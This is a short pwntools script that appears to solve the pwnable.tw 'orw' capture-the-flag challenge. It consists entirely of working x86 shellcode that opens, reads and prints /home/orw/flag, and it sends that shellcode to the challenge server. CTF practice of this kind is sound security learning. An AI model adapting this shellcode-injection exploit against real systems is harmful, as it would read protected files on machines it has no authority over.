from pwn import *

#open => read => write  in ASM





shellcode_raw = asm('\n'.join([
	'push 0x6761',
 	'push 0x6C662F77',
	'push 0x726F2F65',
	'push 0x6D6F682F',
    'xor edx, edx',
    'xor ecx, ecx',
    'xor eax, eax',
    'mov ebx, esp',
    'mov eax, 0x5',
    'int 0x80', #open file flag
    'mov ebx, eax',
    'mov eax, 0x3',
    'mov ecx, esp',
    'add edx, 0x30',
    'int 0x80', #read from file flag trough fd
    'mov eax, 0x4',
    'xor ebx, ebx',
    'add ebx, 1',
    'mov ecx, esp',
    'int 0x80' #write to stdo
]))
shellcode_assembled = '\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x31\xC0\x83\xC0\x05\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\x83\xC2\x30\xCD\x80\xB8\x04\x00\x00\x00\x31\xDB\x83\xC3\x01\x89\xE1\xCD\x80'
p = remote('chall.pwnable.tw', 10001)
p.recvuntil('shellcode:')
p.sendline(shellcode_assembled)
#Life is tough down here at the ASM level.